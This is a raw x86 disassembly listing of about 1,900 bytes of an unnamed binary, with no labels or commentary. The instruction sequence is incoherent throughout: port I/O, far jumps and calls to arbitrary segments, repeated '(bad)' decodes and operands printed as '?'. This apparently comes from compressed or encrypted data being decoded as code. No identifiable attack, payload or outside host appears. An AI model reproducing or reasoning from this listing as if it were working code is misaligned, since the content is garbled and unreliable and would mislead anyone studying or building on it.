  41570d:	fbld   TBYTE PTR [edi]
  41570f:	lock xchg edx,eax
  415711:	push   esi
  415712:	cdq    
  415713:	aam    0x25
  415715:	sbb    DWORD PTR [eiz*2+0x67ed2f7a],esi
  41571c:	mov    BYTE PTR [ecx-0x71],cl
  41571f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415720:	fld    st(2)
  415722:	dec    edi
  415723:	mov    edx,esi
  415725:	add    al,BYTE PTR [eax+eiz*8]
  415728:	pop    ecx
  415729:	push   esi
  41572a:	sbb    dl,bl
  41572c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41572d:	rol    BYTE PTR [edi],1
  41572f:	cmp    eax,0xd4ec0dfa
  415734:	mov    bl,0x91
  415736:	out    0x65,al
  415738:	push   esi
  415739:	shl    BYTE PTR [ecx-0x2c],0x44
  41573d:	gs je  0x415799
  415740:	retf   
  415741:	cli    
  415742:	ret    0xa7d5
  415745:	repz fdivr QWORD PTR [ebx-0x61dbc878]
  41574c:	add    al,0xb9
  41574e:	retf   
  41574f:	aad    0x3d
  415751:	fsubr  QWORD PTR [esi+0x3421f32f]
  415757:	in     eax,0x70
  415759:	inc    edx
  41575a:	pop    ds
  41575b:	pop    es
  41575c:	xor    al,0xf7
  41575e:	pop    ss
  41575f:	push   edi
  415760:	dec    eax
  415761:	fnstcw WORD PTR [esp+edx*8-0x5f]
  415765:	pop    eax
  415766:	dec    ebx
  415767:	retf   
  415768:	cli    
  415769:	mov    esi,0x4f880258
  41576e:	iret   
  41576f:	and    BYTE PTR [eax+ebp*4+0x6],dh
  415773:	xchg   ecx,eax
  415774:	inc    ebp
  415775:	sbb    eax,0x1b6c0fbe
  41577a:	xchg   BYTE PTR [edx],ah
  41577c:	dec    ecx
  41577d:	repz lea ecx,[eax+ecx*4]
  415781:	adc    DWORD PTR [esi+0xe],ecx
  415784:	adc    ecx,DWORD PTR [esi]
  415786:	mov    bh,0xb1
  415788:	sub    al,BYTE PTR [edx]
  41578a:	jo     0x415710
  41578c:	dec    ebp
  41578d:	dec    ebp
  41578e:	fild   DWORD PTR [ecx+0x19]
  415791:	bound  ebx,QWORD PTR [esi]
  415793:	mov    bh,0x7d
  415795:	push   ebp
  415796:	fdivrp st(1),st
  415798:	push   0x50
  41579a:	and    edi,edx
  41579c:	adc    edx,DWORD PTR [eax-0x7e]
  41579f:	mov    al,ds:0xdebec187
  4157a4:	ins    DWORD PTR es:[edi],dx
  4157a5:	cli    
  4157a6:	or     BYTE PTR [ebp+0x691d7988],bl
  4157ac:	mov    edx,?
  4157ae:	leave  
  4157af:	es dec edi
  4157b1:	add    al,BYTE PTR [edi+esi*4+0x50]
  4157b5:	lahf   
  4157b6:	sbb    dh,cl
  4157b8:	dec    ebx
  4157b9:	jge    0x415749
  4157bb:	ror    BYTE PTR [ecx-0x1e01342f],1
  4157c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157c2:	dec    esi
  4157c3:	add    eax,0x1e0e1e30
  4157c8:	call   0x4a0494a3
  4157cd:	sbb    eax,0x67838560
  4157d2:	sbb    ebp,DWORD PTR [eax+0x7d48a6d0]
  4157d8:	cmp    eax,0xc0bd8603
  4157dd:	adc    DWORD PTR [edi+0x2a],edx
  4157e0:	mov    edi,0x5d5a443d
  4157e5:	cmp    eax,0x8582fd5d
  4157ea:	sbb    ah,BYTE PTR [edi-0x3b]
  4157ed:	retf   
  4157ee:	aam    0x93
  4157f0:	mov    DWORD PTR [ecx+0x5c],edx
  4157f3:	loopne 0x4157e2
  4157f5:	xor    edx,DWORD PTR [eax+ebx*2+0x19]
  4157f9:	add    ebx,DWORD PTR [esi+0x81ff852]
  4157ff:	mov    dh,0x8c
  415801:	or     BYTE PTR [edx],al
  415803:	nop
  415804:	sub    BYTE PTR [eax-0x6b],cl
  415807:	test   al,0xb1
  415809:	ja     0x41581f
  41580b:	xchg   esi,eax
  41580c:	sahf   
  41580d:	retf   
  41580e:	adc    ah,dl
  415810:	or     eax,0x405e40e0
  415815:	add    ah,dl
  415817:	lock pop ds
  415819:	mov    esp,0x69c365cf
  41581e:	push   ds
  41581f:	addr16 mov bl,0x37
  415822:	call   0x40d4:0x66ea26d8
  415829:	(bad)  
  41582a:	lea    ebp,[ebp*4-0x76fcfe48]
  415831:	sub    eax,0x4175375
  415836:	add    al,0x3e
  415838:	repz push ds
  41583a:	into   
  41583b:	lods   eax,DWORD PTR ds:[esi]
  41583c:	jecxz  0x415803
  41583e:	loope  0x4157dd
  415840:	pop    ecx
  415841:	loop   0x41587f
  415843:	sbb    BYTE PTR [ecx-0x6877251f],cl
  415849:	mov    ecx,0x47a01e95
  41584e:	or     al,0xac
  415850:	call   0x6259bd6c
  415855:	inc    ebx
  415856:	add    eax,eax
  415858:	stc    
  415859:	ss jp  0x4158cb
  41585c:	rcl    ebp,0x36
  41585f:	data16 cmp al,0x3
  415862:	gs es and ebx,esp
  415866:	fld    QWORD PTR [eax-0x32]
  415869:	push   esi
  41586a:	gs psrld mm7,mm7
  41586e:	mov    ebp,0x1d8b582b
  415873:	dec    esi
  415874:	mov    BYTE PTR [ecx-0x20],dh
  415877:	js     0x41587c
  415879:	mov    bh,0x21
  41587b:	cmp    eax,0xe04a3f23
  415880:	xchg   edi,eax
  415881:	sub    DWORD PTR [eax],ebp
  415883:	and    al,0xca
  415885:	push   esp
  415886:	push   es
  415887:	cmp    eax,0x7c70832b
  41588c:	mov    DWORD PTR [edi],ecx
  41588e:	and    al,0x18
  415890:	lods   al,BYTE PTR ds:[esi]
  415891:	test   BYTE PTR [edx+0x3c1ca6c7],0xcd
  415898:	(bad)  
  415899:	jg     0x415849
  41589b:	inc    edx
  41589c:	dec    ecx
  41589d:	dec    ebx
  41589e:	mov    ebx,0x1e3188ee
  4158a3:	cmp    al,0x4a
  4158a5:	jp     0x415827
  4158a7:	lea    ebp,[edx+edi*8+0x3d]
  4158ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158ac:	into   
  4158ad:	ja     0x4158c7
  4158af:	in     al,dx
  4158b0:	push   eax
  4158b1:	mov    ds:0x992b045c,eax
  4158b6:	cmp    BYTE PTR [edi-0x78],dl
  4158b9:	pop    ecx
  4158ba:	inc    edi
  4158bb:	(bad)  
  4158bc:	push   ecx
  4158bd:	les    ebx,FWORD PTR [eax+0x2c0277c1]
  4158c3:	or     ch,BYTE PTR [edi]
  4158c5:	mov    BYTE PTR [ebp+0x65321b2d],dh
  4158cb:	sub    DWORD PTR [eax-0x3b75b9e9],esp
  4158d1:	test   esp,ebp
  4158d3:	jb     0x415937
  4158d5:	adc    eax,0x83b47500
  4158da:	pop    ebx
  4158db:	xor    al,0x60
  4158dd:	adc    esp,esp
  4158df:	lods   eax,DWORD PTR ds:[esi]
  4158e0:	mov    ch,al
  4158e2:	(bad)  
  4158e3:	das    
  4158e4:	or     edi,DWORD PTR [edi+0x2]
  4158e7:	and    dl,bl
  4158e9:	(bad)  [esi]
  4158eb:	rol    BYTE PTR [edx+0x30c67499],cl
  4158f1:	jl     0x415921
  4158f3:	arpl   WORD PTR [ebx-0x17e0e095],di
  4158f9:	mov    dl,BYTE PTR [ecx]
  4158fb:	jb     0x41588b
  4158fd:	pusha  
  4158fe:	mov    ah,0xd5
  415900:	inc    ecx
  415901:	gs xchg edi,eax
  415903:	xchg   edx,eax
  415904:	out    0xeb,eax
  415906:	(bad)  
  415907:	pop    ebx
  415908:	mov    BYTE PTR [ecx-0x1f064f2c],ah
  41590e:	stos   DWORD PTR es:[edi],eax
  41590f:	fadd   QWORD PTR [esi+0x1d]
  415912:	sahf   
  415913:	ret    0xfd4d
  415916:	ins    DWORD PTR es:[edi],dx
  415917:	inc    ebp
  415918:	mov    bh,0xba
  41591a:	xchg   ah,dl
  41591c:	ins    BYTE PTR es:[edi],dx
  41591d:	fcom   DWORD PTR [ecx-0x44]
  415920:	mov    DWORD PTR [ebx+0x30],edx
  415923:	shl    ebx,1
  415925:	or     BYTE PTR [ebx+0x33],cl
  415928:	jle    0x41592c
  41592a:	ss ins BYTE PTR es:[edi],dx
  41592c:	ss retf 0x9aea
  415930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415931:	mov    al,0x97
  415933:	ror    DWORD PTR [esi+0x155e4817],1
  415939:	dec    edx
  41593a:	fcmovnbe st,st(4)
  41593c:	retf   0xc7aa
  41593f:	ret    0x363
  415942:	nop
  415943:	int    0xa7
  415945:	sbb    esp,DWORD PTR [ebx+0x58]
  415948:	das    
  415949:	or     BYTE PTR [eax-0x1d],ah
  41594c:	in     eax,dx
  41594d:	xlat   BYTE PTR ds:[ebx]
  41594e:	jge    0x41597d
  415950:	dec    esi
  415951:	loop   0x41591c
  415953:	aad    0x69
  415955:	(bad)  
  415956:	out    0x66,al
  415958:	cdq    
  415959:	dec    ebp
  41595a:	push   eax
  41595b:	or     BYTE PTR [ecx-0x39b61c0d],cl
  415961:	dec    ebp
  415962:	jmp    0x415904
  415964:	jmp    0x41596b
  415966:	ror    BYTE PTR [edi-0x4793d001],1
  41596c:	mov    dh,bh
  41596e:	pop    ds
  41596f:	and    DWORD PTR [ebx],edx
  415971:	ja     0x415917
  415973:	adc    BYTE PTR [edi-0x67],0x96
  415977:	test   BYTE PTR ds:0xaa0a2403,bh
  41597d:	adc    DWORD PTR [esi],edi
  41597f:	pop    es
  415980:	mov    bh,0xd5
  415982:	pusha  
  415983:	inc    edi
  415984:	and    al,0x45
  415986:	pop    ss
  415987:	adc    BYTE PTR [ecx],dh
  415989:	pusha  
  41598a:	pop    es
  41598b:	jnp    0x41591f
  41598d:	dec    esi
  41598e:	or     eax,0x1dc56eac
  415993:	pop    ss
  415994:	std    
  415995:	jbe    0x415a12
  415997:	fisttp DWORD PTR [ebx+0x1c156822]
  41599d:	sbb    DWORD PTR [ebx+0x5d04ca84],ebx
  4159a3:	aad    0xa5
  4159a5:	out    dx,eax
  4159a6:	sahf   
  4159a7:	les    edx,FWORD PTR [ebp-0x18]
  4159aa:	shl    BYTE PTR [esi],cl
  4159ac:	mov    bh,bh
  4159ae:	jmp    0x565b7ad8
  4159b3:	push   ss
  4159b4:	das    
  4159b5:	add    dl,BYTE PTR [ecx+eax*8]
  4159b8:	lods   al,BYTE PTR ds:[esi]
  4159b9:	cmp    BYTE PTR [ecx-0x2f],bh
  4159bc:	mov    edx,0x4eb71feb
  4159c1:	sbb    cl,bh
  4159c3:	mov    ebp,0xd67280c4
  4159c8:	sub    esi,ebp
  4159ca:	and    DWORD PTR [eax],0xffffffc2
  4159cd:	int    0xb2
  4159cf:	sbb    eax,0x771f0e9d
  4159d4:	ja     0x4159c8
  4159d6:	ror    DWORD PTR [edi],cl
  4159d8:	out    dx,al
  4159d9:	ret    
  4159da:	in     eax,dx
  4159db:	mov    ecx,DWORD PTR [eax-0x42]
  4159de:	mov    ch,0xd1
  4159e0:	ds lock call 0xa649a4a1
  4159e7:	push   ebp
  4159e8:	test   BYTE PTR [eax+0xa],ah
  4159eb:	sahf   
  4159ec:	mov    BYTE PTR [ebx+0x42],dl
  4159ef:	mov    eax,0xb75cada8
  4159f4:	xor    al,0x2
  4159f6:	out    0xa4,al
  4159f8:	mov    ebx,0x6aaf479b
  4159fd:	je     0x415990
  4159ff:	icebp  
  415a00:	rol    DWORD PTR ds:0x2cefda56,cl
  415a06:	shl    esp,cl
  415a08:	(bad)  
  415a09:	add    dh,BYTE PTR [edx-0x7d]
  415a0c:	push   edi
  415a0d:	enter  0x54ef,0x5b
  415a11:	lea    esp,[eax+0x1b]
  415a14:	push   edx
  415a15:	stos   BYTE PTR es:[edi],al
  415a16:	repz test al,0xba
  415a19:	ds adc esi,edx
  415a1c:	push   0xffffffbb
  415a1e:	xor    DWORD PTR [esi-0x3d],esp
  415a21:	mov    cl,0xce
  415a23:	adc    eax,0x791fcdd1
  415a28:	xlat   BYTE PTR ds:[ebx]
  415a29:	inc    ebp
  415a2a:	cli    
  415a2b:	cli    
  415a2c:	jnp    0x415a46
  415a2e:	leave  
  415a2f:	inc    edi
  415a30:	por    mm4,QWORD PTR [edx-0x46]
  415a34:	cs push esi
  415a36:	cmc    
  415a37:	in     al,dx
  415a38:	rol    bl,cl
  415a3a:	and    BYTE PTR [edx+eax*1-0x6e3c9b30],dl
  415a41:	push   ds
  415a42:	push   es
  415a43:	add    edx,esp
  415a45:	add    DWORD PTR [edi],esi
  415a47:	sar    esi,0xe2
  415a4a:	aam    0xd4
  415a4c:	or     BYTE PTR [edi-0x33],bh
  415a4f:	mov    bl,0x1c
  415a51:	and    eax,0x4789b963
  415a56:	mov    ebx,0x380b0269
  415a5b:	pop    esi
  415a5c:	mov    dl,0x5
  415a5e:	inc    eax
  415a5f:	xchg   ebp,eax
  415a60:	lods   al,BYTE PTR ds:[esi]
  415a61:	sbb    BYTE PTR [ecx+0x1f169b69],cl
  415a67:	mov    ch,0x57
  415a69:	xchg   ebx,eax
  415a6a:	(bad)  
  415a6b:	jmp    0x5b5:0xca60605d
  415a72:	push   eax
  415a73:	retf   
  415a74:	repz inc ecx
  415a76:	and    cl,BYTE PTR [esi+edx*2-0x16]
  415a7a:	jl     0x415aad
  415a7c:	call   DWORD PTR [edi]
  415a7e:	dec    ebp
  415a7f:	adc    al,0xb0
  415a81:	jbe    0x415aa6
  415a83:	daa    
  415a84:	or     BYTE PTR [ecx-0x17eb089],0xe
  415a8b:	out    dx,eax
  415a8c:	sub    eax,DWORD PTR [ebx]
  415a8e:	sub    eax,0x1f7cfdfc
  415a93:	mov    ecx,0x7e6f2b5c
  415a98:	mov    dh,0x4e
  415a9a:	and    dh,dl
  415a9c:	test   al,0x51
  415a9e:	lock sub al,0x84
  415aa1:	imul   eax,edx,0xbd403f5
  415aa7:	(bad)  [edx-0xae7692b]
  415aad:	sar    BYTE PTR [eax+0x6eca48e8],1
  415ab3:	aam    0x2b
  415ab5:	jmp    0x17bb847c
  415aba:	ss jp  0x415a4b
  415abd:	outs   dx,DWORD PTR ds:[esi]
  415abe:	scas   al,BYTE PTR es:[edi]
  415abf:	cmp    BYTE PTR [edx-0x55ea92d0],dl
  415ac5:	iret   
  415ac6:	jle    0x415a9d
  415ac8:	jp     0x415b38
  415aca:	loopne 0x415b3e
  415acc:	jg     0x415b2c
  415ace:	dec    edx
  415acf:	jge    0x415b4a
  415ad1:	jb     0x415ad9
  415ad3:	cmp    BYTE PTR [eax+0x59b51e74],0xcd
  415ada:	imul   edx,ebx,0xd5852fe4
  415ae0:	cli    
  415ae1:	or     BYTE PTR [edi-0x57],ch
  415ae4:	fbstp  TBYTE PTR [eax+0x32]
  415ae7:	or     ecx,DWORD PTR [ecx+0xe9acff9]
  415aed:	out    0xc7,eax
  415aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415af0:	ins    DWORD PTR es:[edi],dx
  415af1:	add    bl,al
  415af3:	stos   DWORD PTR es:[edi],eax
  415af4:	(bad)  
  415af6:	push   ebp
  415af7:	cmp    DWORD PTR [eax-0x7749e891],esi
  415afd:	daa    
  415afe:	pop    ebx
  415aff:	or     al,0x45
  415b01:	scas   al,BYTE PTR es:[edi]
  415b02:	bound  esi,QWORD PTR [esi]
  415b04:	fldenv [ebp+0x32]
  415b07:	xchg   ecx,eax
  415b08:	xchg   esp,eax
  415b09:	retf   
  415b0a:	int    0x74
  415b0c:	mov    BYTE PTR [edi-0x777e3067],dh
  415b12:	rcl    BYTE PTR [esi-0x54],0x2
  415b16:	sahf   
  415b17:	push   0x4a
  415b19:	addr16 mov ecx,0xf8e147bc
  415b1f:	leave  
  415b20:	adc    BYTE PTR [esi],cl
  415b22:	pop    ds
  415b23:	xchg   ebx,eax
  415b24:	pusha  
  415b25:	daa    
  415b26:	sbb    al,BYTE PTR [ecx+0x6c]
  415b29:	stc    
  415b2a:	sub    dl,bh
  415b2c:	sub    BYTE PTR [esi],bl
  415b2e:	icebp  
  415b2f:	dec    eax
  415b30:	sub    ch,bh
  415b32:	gs test eax,0x5157b98b
  415b38:	rol    BYTE PTR [ebx-0x5b],cl
  415b3b:	stc    
  415b3c:	dec    eax
  415b3d:	aad    0x66
  415b3f:	aam    0x32
  415b41:	cmp    esp,DWORD PTR [edx+0xb]
  415b44:	sub    al,0x64
  415b46:	repnz or esi,edi
  415b49:	fist   WORD PTR [ebp-0x1bd33a2c]
  415b4f:	retf   0x7834
  415b52:	mov    dl,0xd4
  415b54:	ror    BYTE PTR [ecx],1
  415b56:	sbb    BYTE PTR [ebx-0x4],dl
  415b59:	mov    cl,0xfe
  415b5b:	les    ecx,FWORD PTR [eax-0x2c19b37b]
  415b61:	loopne 0x415b49
  415b63:	int3   
  415b64:	xor    eax,0x8b6d3589
  415b69:	jmp    0xfdb0:0xad0b005
  415b70:	clc    
  415b71:	mov    dh,0x1f
  415b73:	add    DWORD PTR [esp+eax*2+0x18],edi
  415b77:	dec    edx
  415b78:	and    BYTE PTR [edi],al
  415b7a:	lods   eax,DWORD PTR es:[esi]
  415b7c:	dec    ebx
  415b7d:	mov    ebx,DWORD PTR [edi+0x6f71670c]
  415b83:	ds jo  0x415b1b
  415b86:	pusha  
  415b87:	lahf   
  415b88:	or     DWORD PTR [ecx+esi*1],ecx
  415b8b:	mov    ecx,0x9cb913dc
  415b90:	leave  
  415b91:	sub    BYTE PTR [edx+0x39],0x65
  415b95:	mov    ds:0xfa879d20,eax
  415b9a:	and    eax,0x4c9f94af
  415b9f:	mov    ebp,0x29fdc5fc
  415ba4:	push   eax
  415ba5:	ins    DWORD PTR es:[edi],dx
  415ba6:	outs   dx,DWORD PTR ds:[esi]
  415ba7:	aam    0x6a
  415ba9:	test   BYTE PTR [ebx+0x38afd634],bh
  415baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bb0:	dec    esp
  415bb1:	push   ebx
  415bb2:	pusha  
  415bb3:	leave  
  415bb4:	pop    ecx
  415bb5:	xor    BYTE PTR [ecx],bl
  415bb7:	shl    BYTE PTR [ebx+0x24b9bff6],0xfb
  415bbe:	stc    
  415bbf:	aam    0xb1
  415bc1:	cmp    BYTE PTR [edx+0x7f92c81],ch
  415bc7:	in     al,0x86
  415bc9:	idiv   DWORD PTR ds:0xc0a2c204
  415bcf:	adc    ah,dl
  415bd1:	ret    0x9b1b
  415bd4:	pop    ds
  415bd5:	xchg   BYTE PTR [ecx+0x5b3ee5d2],dh
  415bdb:	cdq    
  415bdc:	pushf  
  415bdd:	or     eax,0x64cd8861
  415be2:	pop    ds
  415be3:	push   ecx
  415be5:	pop    edi
  415be6:	cmp    dl,BYTE PTR [edx]
  415be8:	mov    es,WORD PTR ds:0x52499d10
  415bee:	pusha  
  415bef:	neg    edx
  415bf1:	cmp    ebx,DWORD PTR [edi]
  415bf3:	lds    ebx,FWORD PTR [ebp+0x6ccaab0]
  415bf9:	(bad)
  415bfc:	push   edi
  415bfd:	pop    edx
  415bfe:	js     0x415bab
  415c00:	inc    ecx
  415c01:	and    DWORD PTR [ebp-0x64],ecx
  415c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c05:	(bad)  
  415c07:	pop    ds
  415c08:	mov    gs,WORD PTR [ecx]
  415c0a:	scas   eax,DWORD PTR es:[edi]
  415c0b:	sub    BYTE PTR [ebx],0x52
  415c0e:	pop    edi
  415c0f:	repz jle 0x415c27
  415c12:	hlt    
  415c13:	xor    eax,0xb4dff452
  415c18:	xor    al,0xc6
  415c1a:	pop    esi
  415c1b:	dec    DWORD PTR [ecx+0x24ef4945]
  415c21:	xchg   esi,eax
  415c22:	dec    eax
  415c23:	mov    ebx,0x7df005b5
  415c28:	pop    eax
  415c29:	sbb    ecx,DWORD PTR ds:0x1f952042
  415c2f:	xchg   ecx,eax
  415c30:	pusha  
  415c31:	jne    0x415c66
  415c33:	add    al,BYTE PTR [eax-0x502a700b]
  415c39:	xor    BYTE PTR [edx-0x2604400],dh
  415c3f:	mov    eax,0x6955e18b
  415c44:	xchg   edi,eax
  415c45:	push   0x8d18fc57
  415c4a:	pop    eax
  415c4b:	aad    0x84
  415c4d:	or     eax,0x16416b0
  415c52:	lods   eax,DWORD PTR ds:[esi]
  415c53:	pop    ds
  415c54:	mov    bh,0x2b
  415c56:	jne    0x415c2b
  415c58:	mov    ebx,ecx
  415c5a:	jne    0x415c72
  415c5c:	pop    ss
  415c5d:	jg     0x415c31
  415c5f:	retf   0x8ffb
  415c62:	cmp    eax,0x541d8981
  415c67:	inc    edx
  415c68:	pop    ebp
  415c69:	jge    0x415c28
  415c6b:	xor    DWORD PTR [ecx-0x774cd30d],esi
  415c71:	cmp    BYTE PTR [edx+0x7f],bl
  415c74:	xor    al,0x6d
  415c76:	push   0x50e44d5
  415c7b:	leave  
  415c7c:	adc    al,0xa0
  415c7e:	test   bh,0x8b
  415c81:	imul   esp,edx,0x3e
  415c84:	pop    ebp
  415c85:	inc    ebp
  415c86:	pop    ecx
  415c87:	cwde   
  415c88:	cmp    BYTE PTR [edi],dh
  415c8a:	mov    esi,edx
  415c8c:	sbb    ecx,DWORD PTR [eax-0x17b77bde]
  415c92:	jb     0x415c80
  415c94:	sub    cl,dl
  415c96:	pusha  
  415c97:	retf   
  415c98:	adc    DWORD PTR [ebp-0x283885bf],eax
  415c9e:	popa   
  415c9f:	not    dl
  415ca1:	add    eax,0x8b6c1a54
  415ca6:	mov    DWORD PTR [ecx+esi*2],esp
  415ca9:	imul   esp,DWORD PTR [eax+0x33],0x1b
  415cad:	neg    bl
  415caf:	loopne 0x415c77
  415cb1:	xchg   esi,eax
  415cb2:	loopne 0x415ce7
  415cb4:	xor    cl,BYTE PTR ds:[ecx-0x66]
  415cb8:	lods   al,BYTE PTR ds:[esi]
  415cb9:	mov    ebp,0x1aac5493
  415cbe:	add    al,0xf2
  415cc0:	sbb    eax,0x8864172f
  415cc5:	sti    
  415cc6:	fs jle 0x415cf8
  415cc9:	call   FWORD PTR [esi-0x65]
  415ccc:	xchg   ebx,eax
  415ccd:	add    bl,BYTE PTR [edx]
  415ccf:	mov    dh,0x57
  415cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cd2:	outs   dx,DWORD PTR ds:[esi]
  415cd3:	mov    bl,0x5
  415cd5:	or     eax,0xeff27560
  415cda:	lods   eax,DWORD PTR ds:[esi]
  415cdb:	je     0x415d4f
  415cdd:	mov    ch,0x2a
  415cdf:	call   0x20e4:0xd73261fa
  415ce6:	xchg   ebx,eax
  415ce7:	mov    dh,0x6d
  415ce9:	test   BYTE PTR [ecx+0x3f],ah
  415cec:	add    al,0xbc
  415cee:	adc    bh,BYTE PTR [esi]
  415cf0:	cmp    eax,0x84a118a0
  415cf5:	adc    DWORD PTR [eax+0xd2c70fd],edx
  415cfb:	xlat   BYTE PTR ds:[ebx]
  415cfc:	xor    edi,DWORD PTR [edi+0x17b8fdae]
  415d02:	pop    ds
  415d03:	jecxz  0x415d42
  415d05:	inc    esi
  415d06:	les    esi,FWORD PTR [ecx]
  415d08:	cld    
  415d09:	jl     0x415d49
  415d0b:	xlat   BYTE PTR ds:[ebx]
  415d0c:	pop    es
  415d0d:	mov    ds:0x1999af78,eax
  415d12:	add    DWORD PTR [ecx+ecx*4+0x29],esp
  415d16:	mov    BYTE PTR [ebx],cl
  415d18:	xchg   DWORD PTR [edi-0x73],edx
  415d1b:	xchg   ecx,eax
  415d1c:	push   cs
  415d1d:	add    esi,DWORD PTR [edx+eiz*4+0x10]
  415d21:	in     al,dx
  415d22:	mov    ?,esi
  415d24:	js     0x415d2b
  415d26:	xchg   ebp,eax
  415d27:	inc    edi
  415d28:	scas   al,BYTE PTR es:[edi]
  415d29:	add    al,BYTE PTR [eax]
  415d2b:	cwde   
  415d2c:	ss jmp 0x415d04
  415d2f:	loope  0x415d50
  415d31:	push   edi
  415d32:	mov    al,ds:0x58059d2e
  415d37:	mov    esp,ecx
  415d39:	xchg   ebp,edx
  415d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d3c:	mov    BYTE PTR [edi-0x10],ah
  415d3f:	(bad)  
  415d40:	sub    al,0x43
  415d42:	(bad)  
  415d43:	jecxz  0x415d25
  415d45:	inc    esi
  415d46:	mov    edx,0x22834d96
  415d4b:	rol    BYTE PTR [ebp-0x764b84ab],0x15
  415d52:	dec    esp
  415d53:	cli    
  415d54:	fs mov edi,es
  415d57:	fisub  DWORD PTR [edi-0x11]
  415d5a:	and    BYTE PTR [edi-0x7a],dh
  415d5d:	push   esi
  415d5e:	mov    ebx,0x3b1f0448
  415d64:	into   
  415d65:	outs   dx,DWORD PTR ds:[esi]
  415d66:	add    BYTE PTR [ebx],bh
  415d68:	push   esp
  415d69:	mov    BYTE PTR [esi],ch
  415d6b:	aam    0xb9
  415d6d:	out    dx,al
  415d6e:	mov    ebx,0xc9afd177
  415d73:	int    0x6e
  415d75:	sub    bl,BYTE PTR [edi]
  415d77:	xor    ecx,DWORD PTR [eax+0x2426aa46]
  415d7d:	cmc    
  415d7e:	je     0x415d55
  415d80:	je     0x415dfb
  415d82:	and    ebp,esi
  415d84:	mov    ecx,0x86d6b695
  415d89:	popf   
  415d8a:	in     eax,0xd1
  415d8c:	shl    DWORD PTR [edx+0x5e],cl
  415d8f:	dec    esp
  415d90:	push   0xeaa1411
  415d95:	test   eax,0xc5b77c11
  415d9a:	aam    0x88
  415d9c:	xchg   ebx,eax
  415d9e:	jnp    0x415d85
  415da0:	sub    eax,0xa154004f
  415da5:	outs   dx,BYTE PTR ds:[esi]
  415da6:	into   
  415da7:	dec    esi
  415da8:	add    al,ah
  415daa:	in     eax,0xd4
  415dac:	add    eax,0x66f0936e
  415db1:	inc    esp
  415db2:	clc    
  415db3:	clc    
  415db4:	mov    bl,cl
  415db6:	(bad)  
  415db7:	rcl    BYTE PTR [esi],0x0
  415dba:	fcmovne st,st(7)
  415dbc:	js     0x415dc0
  415dbe:	pop    esi
  415dbf:	idiv   DWORD PTR [edx-0x37e34020]
  415dc5:	xchg   esp,eax
  415dc6:	add    edx,edx
  415dc8:	mov    ecx,esi
  415dca:	mov    ds:0x713355e7,eax
  415dcf:	mov    ebx,0xe55805f5
  415dd4:	sub    dh,BYTE PTR [eax-0x1d018128]
  415dda:	fbld   TBYTE PTR [ecx+0x58]
  415ddd:	iret   
  415dde:	adc    dl,bh
  415de0:	(bad)  
  415de2:	js     0x415dba
  415de4:	ss push ebx
  415de6:	mov    edi,ds
  415de8:	les    ebx,FWORD PTR ds:0xa33c34
  415dee:	nop
  415def:	cmp    ebp,DWORD PTR [ebx+0x3]
  415df2:	into   
  415df3:	shl    DWORD PTR [ecx],1
  415df5:	aaa    
  415df6:	adc    dl,ah
  415df8:	fiadd  DWORD PTR ds:0xf973184c
  415dfe:	jb     0x415de5
  415e00:	mov    ebp,edi
  415e02:	popa   
  415e03:	sbb    DWORD PTR [edi-0x52ae1846],0x25
  415e0a:	and    BYTE PTR [ecx],dh
  415e0c:	push   0xd7d6635b
  415e11:	sbb    BYTE PTR [ebp+0x6af174ec],0x1d
  415e18:	mov    BYTE PTR [esi-0x1371ace1],bh
  415e1e:	dec    esp
  415e1f:	pop    ecx
  415e20:	loopne 0x415e65
  415e22:	jle    0x415e09
  415e24:	mov    al,ds:0xc8bc5c05
  415e29:	or     BYTE PTR [edx],bl
  415e2b:	ins    BYTE PTR es:[edi],dx
  415e2c:	test   DWORD PTR [eax+0x1e],edx
  415e2f:	and    ebx,ecx
  415e31:	int    0x95
  415e33:	sub    dl,dl
  415e35:	sar    DWORD PTR ds:0xfdebcdd7,0x2c
  415e3c:	(bad)  
  415e3d:	sub    edx,DWORD PTR [ebx+0x1e70e9ab]
  415e43:	or     esi,DWORD PTR [esi-0x391fce78]
  415e49:	inc    eax
  415e4a:	or     al,0xb5
  415e4c:	add    eax,0x92e4655
  415e51:	dec    bx
  415e53:	jmp    0x415e6b
  415e55:	add    edi,DWORD PTR [edi]
  415e57:	ins    DWORD PTR es:[edi],dx
  415e58:	mov    BYTE PTR [ebp+0x37],dh
  415e5b:	mov    esp,esp
  415e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e5e:	ins    DWORD PTR es:[edi],dx
  415e5f:	mov    ecx,0xe9941077
  415e64:	lods   eax,DWORD PTR ds:[esi]
  415e65:	nop
  415e66:	pop    ds
  415e67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e68:	pop    ebx
  415e69:	nop
  415e6a:	sbb    BYTE PTR [edx-0x72],bl
  415e6d:	(bad)  
  415e6f:	repz mov ds:0x90d408aa,al
  415e75:	out    0xdc,al
  415e77:	cwde   
  415e78:	cmp    BYTE PTR [edi],ch
  415e7a:	popa   
  415e7b:	stos   DWORD PTR es:[edi],eax
  415e7c:	jno    0x415e55
  415e7e:	pusha  
  415e7f:	sbb    DWORD PTR [edx],edi
  415e81:	imul   ebx,DWORD PTR [ecx],0xecb5625a
  415e87:	aad    0x1
  415e89:	adc    esi,edx
  415e8b:	aas    
  415e8c:	rcr    esp,0xa1
  415e8f:	call   0x8adf:0x22aec988
  415e96:	jecxz  0x415e18
  415e98:	pop    ebx
  415e99:	dec    edx
  415e9a:	push   esi
  415e9b:	xor    al,0x74
  415e9d:	add    ebp,DWORD PTR [edx]
  415e9f:	repnz adc BYTE PTR ss:[esi-0x3d],dl
  415ea4:	mov    DWORD PTR [edi+0x13],esi
  415ea7:	ins    BYTE PTR es:[edi],dx
  415ea8:	sub    al,0x89
  415eaa:	mov    eax,ds:0x34030700
  415eaf:	ror    DWORD PTR [ecx+0x4],0xf6
  415eb3:	test   DWORD PTR [edi+ebp*1+0x1d5b0b61],eax
  415eba:	pop    ebp
  415ebb:	push   edx
